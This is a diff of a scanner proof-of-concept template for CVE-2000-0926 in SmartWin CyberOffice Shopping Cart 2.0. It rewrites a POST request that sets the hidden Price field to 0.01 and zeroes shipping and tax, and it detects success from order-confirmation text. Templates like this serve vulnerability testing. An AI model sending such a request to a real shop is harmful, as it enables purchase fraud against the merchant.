@@ -1,39 +1,37 @@
 [info]
 author = "ave"
-description = "SmartWin CyberOffice Shopping Cart 2 (CyberShop) stores price in a hidden form field, allowing remote attackers to modify purchase price by altering the 'Price' parameter in HTTP POST requests."
+description = "通过拦截订单提交请求并修改隐藏的 Price 参数值，以任意价格完成商品购买。服务端未对价格参数做有效性校验。"
 id = "POC-AVE-2000-0679"
-name = "CVE-2000-0926 PoC"
-severity = "medium"
-tags = [
-    "cve-2000-0926",
-    "ave-2000-0679",
-]
+name = "SmartWin CyberOffice Shopping Cart 2.0 Price Modification PoC"
+severity = "high"
+tags = ["ave-2000-0679"]
 vuln_id = [
     "CVE-2000-0926",
     "AVE-2000-0679",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/shop/addtocart.asp"
+path = "/{{BaseURL}}/order_process.asp"
 protocol = "http"
 
 [poc.requests.body]
-content = "ProductID=1&Quantity=1&Price=0.01"
+content = "Item=TestProduct&Quantity=1&Price=0.01&Shipping=0&Tax=0&Submit=Submit"
 type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "success",
-    "added",
-    "cart",
+    "Thank you",
+    "Order Confirmation",
+    "Order Number",
 ]
